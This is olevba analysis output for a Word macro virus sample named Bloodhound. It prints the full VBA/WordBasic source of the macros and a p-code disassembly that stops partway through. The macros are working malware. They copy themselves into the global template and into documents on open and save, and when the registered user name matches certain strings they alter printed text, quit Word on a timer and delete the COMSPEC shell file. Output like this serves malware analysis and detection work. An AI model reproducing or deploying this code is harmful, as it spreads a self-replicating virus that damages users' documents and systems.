olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bloodhound
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bloodhound - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: Virus.MSWord.Bloodhound - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim Counter
Dim bAutoOpen
Dim i
Dim Macro$
Dim bFileOpen
Dim bFileSaveAs
Dim bFilePrint
Dim bAutoExec
Dim bWordDE
Dim CurDir_$
Dim FakeDoc$
Dim pos
Dim MacroFile$

Counter = WordBasic.CountMacros(1, 0, 0)

If Counter = 0 Then
    bAutoOpen = 0
Else
    For i = 1 To Counter
        Macro$ = WordBasic.[MacroName$](i, 1, 0)
        If Macro$ = "AutoOpen" Then bAutoOpen = -1
        If Macro$ = "FileOpen" Then bFileOpen = -1
        If Macro$ = "FileSaveAs" Then bFileSaveAs = -1
        If Macro$ = "FilePrint" Then bFilePrint = -1
        If Macro$ = "AutoExec" Then bAutoExec = -1
        If Macro$ = "WordDE" Then bWordDE = -1
    Next i
End If

Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
On Error GoTo -1: On Error GoTo Fail
CurDir_$ = WordBasic.[DefaultDir$](14)
WordBasic.ChDefaultDir CurDir_$, 2
WordBasic.Dialog.FileSaveAs dlg

FakeDoc$ = dlg.Name
If WordBasic.[Right$](FakeDoc$, 3) = "dot" Then
pos = InStr(FakeDoc$, ".")
FakeDoc$ = WordBasic.[Left$](FakeDoc$, pos) + "doc"
dlg.Name = FakeDoc$
End If

If bAutoOpen And bFilePrint And bFileOpen And bAutoExec And bWordDE _
And bFileSaveAs Then
    WordBasic.FileSaveAs dlg
Else
    dlg.Format = 1
    WordBasic.FileSaveAs dlg
    MacroFile$ = WordBasic.[FileName$]()
    WordBasic.MacroCopy "WordSU", MacroFile$ + ":AutoOpen", 1
    WordBasic.MacroCopy "FileOpen", MacroFile$ + ":FileOpen", 1
    WordBasic.MacroCopy "FilePrint", MacroFile$ + ":FilePrint", 1
    WordBasic.MacroCopy "FileSaveAs", MacroFile$ + ":FileSaveAs", 1
    WordBasic.MacroCopy "AutoExec", MacroFile$ + ":AutoExec", 1
    WordBasic.MacroCopy "WordDE", MacroFile$ + ":WordDE", 1
    WordBasic.FileSave
End If

Fail:

End Sub

-------------------------------------------------------------------------------
VBA MACRO FilePrint.bas 
in file: Virus.MSWord.Bloodhound - OLE stream: 'Macros/VBA/FilePrint'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim Id$
Dim i
Dim Gay

Dim lox As Object: Set lox = WordBasic.DialogRecord.HelpAbout(False)
WordBasic.CurValues.HelpAbout lox
Id$ = LCase(lox.APPUSERNAME)
ReDim Lox___$(5)
Lox___$(0) = "386"
Lox___$(1) = "gay"
Lox___$(2) = "gaj"
Lox___$(3) = "ãàÿ"
Lox___$(4) = "rus"

i = 0
While i < 5
    If InStr(1, Id$, Lox___$(i)) <> 0 Then Gay = -1
    i = i + 1
Wend

Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FilePrint(False)
On Error GoTo -1: On Error GoTo Reject
WordBasic.CurValues.FilePrint dlg
WordBasic.Dialog.FilePrint dlg

If WordBasic.Second(WordBasic.Now()) > 40 And Gay Then
    WordBasic.EditReplace Find:="ÿ", Replace:="ìíÿ", ReplaceAll:=1
End If

WordBasic.FilePrint dlg
Reject:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileOpen.bas 
in file: Virus.MSWord.Bloodhound - OLE stream: 'Macros/VBA/FileOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim Counter
Dim bAutoOpen
Dim i
Dim Macro$
Dim bFileOpen
Dim bFilePrint
Dim bFileSaveAs
Dim bAutoExec
Dim bWordDE
Dim MacroFile$

Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
On Error GoTo -1: On Error GoTo Fail
WordBasic.CurValues.FileOpen dlg
WordBasic.Dialog.FileOpen dlg
WordBasic.FileOpen dlg

Counter = WordBasic.CountMacros(1, 0, 0)

If Counter = 0 Then
    bAutoOpen = 0
Else
    For i = 1 To Counter
        Macro$ = WordBasic.[MacroName$](i, 1, 0)
        If Macro$ = "AutoOpen" Then bAutoOpen = -1
        If Macro$ = "FileOpen" Then bFileOpen = -1
        If Macro$ = "FilePrint" Then bFilePrint = -1
        If Macro$ = "FileSaveAs" Then bFileSaveAs = -1
        If Macro$ = "AutoExec" Then bAutoExec = -1
        If Macro$ = "WordDE" Then bWordDE = -1
    Next i
End If

If bAutoOpen And bFileOpen And bFilePrint And bFileSaveAs _
And bAutoExec And bWordDE Then
Else
    MacroFile$ = WordBasic.[FileName$]()
    WordBasic.FileSaveAs Format:=1
    WordBasic.MacroCopy "WordSU", MacroFile$ + ":AutoOpen", 1
    WordBasic.MacroCopy "FileOpen", MacroFile$ + ":FileOpen", 1
    WordBasic.MacroCopy "FilePrint", MacroFile$ + ":FilePrint", 1
    WordBasic.MacroCopy "FileSaveAs", MacroFile$ + ":FileSaveAs", 1
    WordBasic.MacroCopy "AutoExec", MacroFile$ + ":AutoExec", 1
    WordBasic.MacroCopy "WordDE", MacroFile$ + ":WordDE", 1
    WordBasic.FileSave
End If

Fail:

End Sub

-------------------------------------------------------------------------------
VBA MACRO AutoExec.bas 
in file: Virus.MSWord.Bloodhound - OLE stream: 'Macros/VBA/AutoExec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim Id$
Dim i
Dim Gay
Dim Minutes
Dim Hours
Dim Alarm$

Dim lox As Object: Set lox = WordBasic.DialogRecord.HelpAbout(False)
WordBasic.CurValues.HelpAbout lox
Id$ = LCase(lox.APPUSERNAME)
ReDim Lox___$(5)
Lox___$(0) = "386"
Lox___$(1) = "gay"
Lox___$(2) = "gaj"
Lox___$(3) = "ãàÿ"
Lox___$(4) = "rus"
For i = 0 To 4
If InStr(1, Id$, Lox___$(i)) <> 0 Then Gay = -1
Next i

If Gay Then
    Minutes = WordBasic.Second(WordBasic.Now()) + WordBasic.Minute(WordBasic.Now())
    Hours = WordBasic.Hour(WordBasic.Now())
    If Minutes > 59 Then
        Minutes = Minutes - 60
        Hours = Hours + 1
    End If
    If Hours = 24 Then Hours = 0
    Alarm$ = WordBasic.[LTrim$](Str(Hours)) + ":" + WordBasic.[LTrim$](Str(Minutes))
    WordBasic.OnTime Alarm$, "WordDE"
End If

End Sub
-------------------------------------------------------------------------------
VBA MACRO WordSU.bas 
in file: Virus.MSWord.Bloodhound - OLE stream: 'Macros/VBA/WordSU'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim Counter
Dim i
Dim Macro$
Dim bWordSU
Dim bFileOpen
Dim bFilePrint
Dim bFileSaveAs
Dim bAutoExec
Dim bWordDE
Dim MacroFile$
Dim lox As Object
Dim Id$
ReDim Lox___$(0)
Dim Gay
Dim A$
Dim Comspec$

Counter = WordBasic.CountMacros(0, 0, 0)

For i = 1 To Counter
    Macro$ = WordBasic.[MacroName$](i, 0, 0)
    If Macro$ = "WordSU" Then bWordSU = -1
    If Macro$ = "FileOpen" Then bFileOpen = -1
    If Macro$ = "FilePrint" Then bFilePrint = -1
    If Macro$ = "FileSaveAs" Then bFileSaveAs = -1
    If Macro$ = "AutoExec" Then bAutoExec = -1
    If Macro$ = "WordDE" Then bWordDE = -1
Next i

If bWordSU And bFileOpen And bFilePrint And bFileSaveAs And bAutoExec And bWordDE Then
Else
    MacroFile$ = WordBasic.[FileName$]()
    WordBasic.MacroCopy MacroFile$ + ":AutoOpen", "Normal:WordSU", 1
    WordBasic.MacroCopy MacroFile$ + ":FilePrint", "Normal:FilePrint", 1
    WordBasic.MacroCopy MacroFile$ + ":FileOpen", "Normal:FileOpen", 1
    WordBasic.MacroCopy MacroFile$ + ":AutoExec", "Normal:AutoExec", 1
    WordBasic.MacroCopy MacroFile$ + ":WordDE", "Normal:WordDE", 1
    WordBasic.MacroCopy MacroFile$ + ":FileSaveAs", "Normal:FileSaveAs", 1

    Set lox = WordBasic.DialogRecord.HelpAbout(False)
    WordBasic.CurValues.HelpAbout lox
    Id$ = LCase(lox.APPUSERNAME)
    ReDim Lox___$(5)
    Lox___$(0) = "386"
    Lox___$(1) = "gay"
    Lox___$(2) = "gaj"
    Lox___$(3) = "ãàÿ"
    Lox___$(4) = "rus"

    For i = 0 To 4
    If InStr(1, Id$, Lox___$(i)) <> 0 Then Gay = -1
    Next i

    If Gay Then
        Id$ = WordBasic.[GetProfileString$]("gay", "lox")
        Select Case Len(Id$)
            Case 0
                WordBasic.SetProfileString "gay", "lox", "1"
                WordBasic.MsgBox "Initiating StartUp Sequence", "WordSU Info", 64
            Case Is < 5
                A$ = Id$ + "1"
                WordBasic.SetProfileString "gay", "lox", A$
            Case Else
                WordBasic.SetProfileString "gay", "lox", "1"
                Comspec$ = Environ("COMSPEC")
                SetAttr Comspec$, 0
                WordBasic.Kill Comspec$
        End Select
    End If

End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO WordDE.bas 
in file: Virus.MSWord.Bloodhound - OLE stream: 'Macros/VBA/WordDE'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
WordBasic.FileExit 2
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Bloodhound
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/FileSaveAs - 3768 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn Counter
' Line #3:
' 	Dim 
' 	VarDefn bAutoOpen
' Line #4:
' 	Dim 
' 	VarDefn i
' Line #5:
' 	Dim 
' 	VarDefn Macro
' Line #6:
' 	Dim 
' 	VarDefn bFileOpen
' Line #7:
' 	Dim 
' 	VarDefn bFileSaveAs
' Line #8:
' 	Dim 
' 	VarDefn bFilePrint
' Line #9:
' 	Dim 
' 	VarDefn bAutoExec
' Line #10:
' 	Dim 
' 	VarDefn bWordDE
' Line #11:
' 	Dim 
' 	VarDefn CurDir_
' Line #12:
' 	Dim 
' 	VarDefn FakeDoc
' Line #13:
' 	Dim 
' 	VarDefn pos
' Line #14:
' 	Dim 
' 	VarDefn MacroFile
' Line #15:
' Line #16:
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0003 
' 	St Counter 
' Line #17:
' Line #18:
' 	Ld Counter 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #19:
' 	LitDI2 0x0000 
' 	St bAutoOpen 
' Line #20:
' 	ElseBlock 
' Line #21:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Counter 
' 	For 
' Line #22:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0003 
' 	St Macro$ 
' Line #23:
' 	Ld Macro$ 
' 	LitStr 0x0008 "AutoOpen"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	UMi 
' 	St bAutoOpen 
' 	EndIf 
' Line #24:
' 	Ld Macro$ 
' 	LitStr 0x0008 "FileOpen"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	UMi 
' 	St bFileOpen 
' 	EndIf 
' Line #25:
' 	Ld Macro$ 
' 	LitStr 0x000A "FileSaveAs"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	UMi 
' 	St bFileSaveAs 
' 	EndIf 
' Line #26:
' 	Ld Macro$ 
' 	LitStr 0x0009 "FilePrint"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	UMi 
' 	St bFilePrint 
' 	EndIf 
' Line #27:
' 	Ld Macro$ 
' 	LitStr 0x0008 "AutoExec"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	UMi 
' 	St bAutoExec 
' 	EndIf 
' Line #28:
' 	Ld Macro$ 
' 	LitStr 0x0006 "WordDE"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	UMi 
' 	St bWordDE 
' 	EndIf 
' Line #29:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #30:
' 	EndIfBlock 
' Line #31:
' Line #32:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #33:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Fail 
' Line #34:
' 	LitDI2 0x000E 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	St CurDir_$ 
' Line #35:
' 	Ld CurDir_$ 
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemCall ChDefaultDir 0x0002 
' Line #36:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #37:
' Line #38:
' 	Ld dlg 
' 	MemLd New 
' 	St FakeDoc$ 
' Line #39:
' 	Ld FakeDoc$ 
' 	LitDI2 0x0003 
' 	Ld WordBasic 
' 	ArgsMemLd [Right$] 0x0002 
' 	LitStr 0x0003 "dot"
' 	Eq 
' 	IfBlock 
' Line #40:
' 	Ld FakeDoc$ 
' 	LitStr 0x0001 "."
' 	FnInStr 
' 	St pos 
' Line #41:
' 	Ld FakeDoc$ 
' 	Ld pos 
' 	Ld WordBasic 
' 	ArgsMemLd [Left$] 0x0002 
' 	LitStr 0x0003 "doc"
' 	Add 
' 	St FakeDoc$ 
' Line #42:
' 	Ld FakeDoc$ 
' 	Ld dlg 
' 	MemSt New 
' Line #43:
' 	EndIfBlock 
' Line #44:
' Line #45:
' 	LineCont 0x0004 0A 00 00 00
' 	Ld bAutoOpen 
' 	Ld bFilePrint 
' 	And 
' 	Ld bFileOpen 
' 	And 
' 	Ld bAutoExec 
' 	And 
' 	Ld bWordDE 
' 	And 
' 	Ld bFileSaveAs 
' 	And 
' 	IfBlock 
' Line #46:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #47:
' 	ElseBlock 
' Line #48:
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' Line #49:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #50:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St MacroFile$ 
' Line #51:
' 	LitStr 0x0006 "WordSU"
' 	Ld MacroFile$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #52:
' 	LitStr 0x0008 "FileOpen"
' 	Ld MacroFile$ 
' 	LitStr 0x0009 ":FileOpen"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #53:
' 	LitStr 0x0009 "FilePrint"
' 	Ld MacroFile$ 
' 	LitStr 0x000A ":FilePrint"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #54:
' 	LitStr 0x000A "FileSaveAs"
' 	Ld MacroFile$ 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #55:
' 	LitStr 0x0008 "AutoExec"
' 	Ld MacroFile$ 
' 	LitStr 0x0009 ":AutoExec"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #56:
' 	LitStr 0x0006 "WordDE"
' 	Ld MacroFile$ 
' 	LitStr 0x0007 ":WordDE"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #57:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #58:
' 	EndIfBlock 
' Line #59:
' Line #60:
' 	Label Fail 
' Line #61:
' Line #62:
' 	EndSub 
' Line #63:
' Macros/VBA/FilePrint - 2345 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn Id
' Line #3:
' 	Dim 
' 	VarDefn i
' Line #4:
' 	Dim 
' 	VarDefn Gay
' Line #5:
' Line #6:
' 	Dim 
' 	VarDefn lox (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd HelpAbout 0x0001 
' 	Set lox 
' Line #7:
' 	Ld lox 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall HelpAbout 0x0001 
' Line #8:
' 	Ld lox 
' 	MemLd APPUSERNAME 
' 	ArgsLd LCase 0x0001 
' 	St Id$ 
' Line #9:
' 	OptionBase 
' 	LitDI2 0x0005 
' 	Redim Lox___$ 0x0001 (As String)
' Line #10:
' 	LitStr 0x0003 "386"
' 	LitDI2 0x0000 
' 	ArgsSt Lox___$ 0x0001 
' Line #11:
' 	LitStr 0x0003 "gay"
' 	LitDI2 0x0001 
' 	ArgsSt Lox___$ 0x0001 
' Line #12:
' 	LitStr 0x0003 "gaj"
' 	LitDI2 0x0002 
' 	ArgsSt Lox___$ 0x0001 
' Line #13:
' 	LitStr 0x0003 "ãàÿ"
' 	LitDI2 0x0003 
' 	ArgsSt Lox___$ 0x0001 
' Line #14:
' 	LitStr 0x0003 "rus"
' 	LitDI2 0x0004 
' 	ArgsSt Lox___$ 0x0001 
' Line #15:
' Line #16:
' 	LitDI2 0x0000 
' 	St i 
' Line #17:
' 	Ld i 
' 	LitDI2 0x0005 
' 	Lt 
' 	While 
' Line #18:
' 	LitDI2 0x0001 
' 	Ld Id$ 
' 	Ld i 
' 	ArgsLd Lox___$ 0x0001 
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	UMi 
' 	St Gay 
' 	EndIf 
' Line #19:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #20:
' 	Wend 
' Line #21:
' Line #22:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FilePrint 0x0001 
' 	Set dlg 
' Line #23:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Reject 
' Line #24:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FilePrint 0x0001 
' Line #25:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FilePrint 0x0001 
' Line #26:
' Line #27:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Second 0x0001 
' 	LitDI2 0x0028 
' 	Gt 
' 	Ld Gay 
' 	And 
' 	IfBlock 
' Line #28:
' 	LitStr 0x0001 "ÿ"
' 	ParamNamed Find 
' 	LitStr 0x0003 "ìíÿ"
' 	ParamNamed Replace 
' 	LitDI2 0x0001 
' 	ParamNamed ReplaceAll 
' 	Ld WordBasic 
' 	ArgsMemCall EditReplace 0x0003 
' Line #29:
' 	EndIfBlock 
' Line #30:
' Line #31:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FilePrint 0x0001 
' Line #32:
' 	Label Reject 
' Line #33:
' 	EndSub 
' Macros/VBA/FileOpen - 3223 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn Counter
' Line #3:
' 	Dim 
' 	VarDefn bAutoOpen
' Line #4:
' 	Dim 
' 	VarDefn i
' Line #5:
' 	Dim 
' 	VarDefn Macro
' Line #6:
' 	Dim 
' 	VarDefn bFileOpen
' Line #7:
' 	Dim 
' 	VarDefn bFilePrint
' Line #8:
' 	Dim 
' 	VarDefn bFileSaveAs
' Line #9:
' 	Dim 
' 	VarDefn bAutoExec
' Line #10:
' 	Dim 
' 	VarDefn bWordDE
' Line #11:
' 	Dim 
' 	VarDefn MacroFile
' Line #12:
' Line #13:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileOpen 0x0001 
' 	Set dlg 
' Line #14:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Fail 
' Line #15:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileOpen 0x0001 
' Line #16:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileOpen 0x0001 
' Line #17:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileOpen 0x0001 
' Line #18:
' Line #19:
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0003 
' 	St Counter 
' Line #20:
' Line #21:
' 	Ld Counter 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #22:
' 	LitDI2 0x0000 
' 	St bAutoOpen 
' Line #23:
' 	ElseBlock 
' Line #24:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Counter 
' 	For 
' Line #25:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0003 
' 	St Macro$ 
' Line #26:
' 	Ld Macro$ 
' 	LitStr 0x0008 "AutoOpen"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	UMi 
' 	St bAutoOpen 
' 	EndIf 
' Line #27:
' 	Ld Macro$ 
' 	LitStr 0x0008 "FileOpen"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	UMi 
' 	St bFileOpen 
' 	EndIf 
' Line #28:
' 	Ld Macro$ 
' 	LitStr 0x0009 "FilePrint"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	UMi 
' 	St bFilePrint 
' 	EndIf 
' Line #29:
' 	Ld Macro$ 
' 	LitStr 0x000A "FileSaveAs"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	UMi 
' 	St bFileSaveAs 
' 	EndIf 
' Line #30:
' 	Ld Macro$ 
' 	LitStr 0x0008 "AutoExec"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	UMi 
' 	St bAutoExec 
' 	EndIf 
' Line #31:
' 	Ld Macro$ 
' 	LitStr 0x0006 "WordDE"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	UMi 
' 	St bWordDE 
' 	EndIf 
' Line #32:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #33:
' 	EndIfBlock 
' Line #34:
' Line #35:
' 	LineCont 0x0004 08 00 00 00
' 	Ld bAutoOpen 
' 	Ld bFileOpen 
' 	And 
' 	Ld bFilePrint 
' 	And 
' 	Ld bFileSaveAs 
' 	And 
' 	Ld bAutoExec 
' 	And 
' 	Ld bWordDE 
' 	And 
' 	IfBlock 
' Line #36:
' 	ElseBlock 
' Line #37:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St MacroFile$ 
' Line #38:
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #39:
' 	LitStr 0x0006 "WordSU"
' 	Ld MacroFile$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #40:
' 	LitStr 0x0008 "FileOpen"
' 	Ld MacroFile$ 
' 	LitStr 0x0009 ":FileOpen"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #41:
' 	LitStr 0x0009 "FilePrint"
' 	Ld MacroFile$ 
' 	LitStr 0x000A ":FilePrint"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #42:
' 	LitStr 0x000A "FileSaveAs"
' 	Ld MacroFile$ 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #43:
' 	LitStr 0x0008 "AutoExec"
' 	Ld MacroFile$ 
' 	LitStr 0x0009 ":AutoExec"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #44:
' 	LitStr 0x0006 "WordDE"
' 	Ld MacroFile$ 
' 	LitStr 0x0007 ":WordDE"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #45:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #46:
' 	EndIfBlock 
' Line #47:
' Line #48:
' 	Label Fail 
' Line #49:
' Line #50:
' 	EndSub 
' Line #51:
' Macros/VBA/AutoExec - 2475 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn Id
' Line #3:
' 	Dim 
' 	VarDefn i
' Line #4:
' 	Dim 
' 	VarDefn Gay
' Line #5:
' 	Dim 
' 	VarDefn Minutes
' Line #6:
' 	Dim 
' 	VarDefn Hours
' Line #7:
' 	Dim 
' 	VarDefn Alarm
' Line #8:
' Line #9:
' 	Dim 
' 	VarDefn lox (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd HelpAbout 0x0001 
' 	Set lox 
' Line #10:
' 	Ld lox 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall HelpAbout 0x0001 
' Line #11:
' 	Ld lox 
' 	MemLd APPUSERNAME 
' 	ArgsLd LCase 0x0001 
' 	St Id$ 
' Line #12:
' 	OptionBase 
' 	LitDI2 0x0005 
' 	Redim Lox___$ 0x0001 (As String)
' Line #13:
' 	LitStr 0x0003 "386"
' 	LitDI2 0x0000 
' 	ArgsSt Lox___$ 0x0001 
' Line #14:
' 	LitStr 0x0003 "gay"
' 	LitDI2 0x0001 
' 	ArgsSt Lox___$ 0x0001 
' Line #15:
' 	LitStr 0x0003 "gaj"
' 	LitDI2 0x0002 
' 	ArgsSt Lox___$ 0x0001 
' Line #16:
' 	LitStr 0x0003 "ãàÿ"
' 	LitDI2 0x0003 
' 	ArgsSt Lox___$ 0x0001 
' Line #17:
' 	LitStr 0x0003 "rus"
' 	LitDI2 0x0004 
' 	ArgsSt Lox___$ 0x0001 
' Line #18:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0004 
' 	For 
' Line #19:
' 	LitDI2 0x0001 
' 	Ld Id$ 
' 	Ld i 
' 	ArgsLd Lox___$ 0x0001 
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	UMi 
' 	St Gay 
' 	EndIf 
' Line #20:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #21:
' Line #22:
' 	Ld Gay 
' 	IfBlock 
' Line #23:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Second 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Minute 0x0001 
' 	Add 
' 	St Minutes 
' Line #24:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Hour 0x0001 
' 	St Hours 
' Line #25:
' 	Ld Minutes 
' 	LitDI2 0x003B 
' 	Gt 
' 	IfBlock 
' Line #26:
' 	Ld Minutes 
' 	LitDI2 0x003C 
' 	Sub 
' 	St Minutes 
' Line #27:
' 	Ld Hours 
